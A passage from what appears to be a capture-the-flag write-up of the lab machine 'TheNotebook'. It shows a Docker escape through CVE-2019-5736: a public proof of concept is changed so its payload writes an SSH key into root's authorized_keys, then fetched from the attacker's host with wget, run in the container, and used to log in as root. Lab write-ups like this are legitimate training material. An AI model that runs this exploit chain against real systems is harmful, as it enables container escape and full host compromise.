+</span></span><span class="line"><span class="cl">Got permission denied <span class="k">while</span> trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.38/version: dial unix /var/run/docker.sock: connect: permission denied</span></span></code></pre>
+</figure><h4 id="docker-breakout-cve-2019-5736">Docker Breakout CVE-2019-5736</h4>
+<p>To exploit the docker CVE-2019-5736, I will be using this <a href="https://github.com/Frichetten/CVE-2019-5736-PoC.git"target="_blank" rel="noopener noreferrer"
+>PoC</a> by Frichetten. The exploit&rsquo;s author also gives a nice writeup about what the exploit does.</p>
+<p>I will clone the PoC to my working directory.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
+</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;CVE-2019-5736-PoC&#39;</span>...
+</span></span><span class="line"><span class="cl">remote: Enumerating objects: 45, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Total <span class="m">45</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">45</span>
+</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>45/45<span class="o">)</span>, 1.69 MiB <span class="p">|</span> 254.00 KiB/s, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.</span></span></code></pre>
+</figure><p>In the <code>main.go</code>, I will modify the payload variable with a bash script that will inject my SSH public key to root&rsquo;s <code>authorized_keys</code> file.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n mkdir -p /root/.ssh/ &amp;&amp; echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39; &gt; /root/.ssh/authorized_keys&#34;</span></span></span></code></pre>
+</figure><p>I will compile the PoC and host it.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «CVE-2019-5736-PoC» «10.10.14.17» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+</span></span><span class="line"><span class="cl">$ go build -o breakout main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...</span></span></code></pre>
+</figure><p>On TheNotebook, I will have two SSH sessions. On the first SSH session, I will use it to download and execute the exploit within the container.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 bash
+</span></span><span class="line"><span class="cl">root@0f4c2517af40:/opt/webapp# wget -q 10.10.14.17:8080/breakout <span class="o">&amp;&amp;</span> chmod +x breakout
+</span></span><span class="line"><span class="cl">root@0f4c2517af40:/opt/webapp# ./breakout
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully</span></span></code></pre>
+</figure><p>Then on the second session, I will run the sudo command.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 /bin/sh</span></span></code></pre>
+</figure><p>But then, on the container session, I get the following error:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@0f4c2517af40:/opt/webapp# ./breakout
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">17638</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found the PID: self
+</span></span><span class="line"><span class="cl">strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax</span></span></code></pre>
+</figure><p>To resolve that, at line 42 of the <code>main.go</code> file, I will add another condition to ignore PID with name &ldquo;self&rdquo;.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Added by me
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="c1">// end
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
+</figure><p>I will re-compile the exploit and transfer it again to the container, and this time it works!</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@c8cf4072ca26:/opt/webapp# ./breakout 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">1729</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Getting file handle
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc000444000<span class="o">}</span>
+</span></span><span class="line"><span class="cl">root@c8cf4072ca26:/opt/webapp# </span></span></code></pre>
+</figure><p>The full process</p>
+<p><div class="img-container"><img src="imgs/image-20210807220201808.png" alt="image-20210807220201808"  /></div>
+</p>
+<h4 id="ssh---root">SSH - Root</h4>
+<p>Now I can SSH login as root using my own private key.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17»  
+</span></span><span class="line"><span class="cl">$ ssh root@10.10.10.230
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.1               Processes:              <span class="m">190</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">1</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
+</span></span><span class="line"><span class="cl">  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Fri Jul <span class="m">23</span> 14:27:18 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">root@thenotebook:~# </span></span></code></pre>
+</figure>]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
